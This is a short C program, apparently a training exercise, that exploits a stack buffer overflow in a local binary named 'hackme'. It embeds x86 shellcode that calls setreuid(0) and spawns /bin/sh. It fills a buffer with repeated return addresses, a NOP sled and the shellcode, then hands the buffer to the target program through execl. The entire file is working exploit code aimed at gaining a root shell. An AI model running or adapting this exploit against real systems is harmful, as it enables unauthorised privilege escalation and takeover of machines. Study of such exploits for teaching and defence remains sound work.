#include <stdio.h>
#include <string.h>
#include <unistd.h>

unsigned char scode[]="\x31\xc0\x31\xdb\x29\xc9\x89\xca\xb0\x46\xcd\x80\x29\xc0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x54\x89\xe1\xb0\x0b\xcd\x80";
int main(void)
{
//Shellcode that calls setreuid() to 0 and execve() with /bin/sh

//exact size of buffer when fully populated
char buffer[200];  //our buffer of 200 bytes 
int i, ret; //OUr variable to reference based on its mem address and our RP variable
ret = (int) &i + 8; //The offset from the addres of i we want to set our RP to
printf("i is at: %p\n", &i);
printf("buffer is at: %p\n", &buffer);
printf("RP is at: %p\n", & ret);

for(i=0; i < 64; i+=4) //loop to write our RP 16 times
{
    *((int *)(buffer+i)) = ret;
}

memset(buffer+64, 0x90, 64); //Setting memory at the end of our 16 RP writes to 0x90 * 64, our NOP sled
memcpy(buffer+128, scode, sizeof(scode));
execl("/home/bob_dole/hackme", "hackme", buffer, NULL); //our call to execl() to open our vulnerable program
}
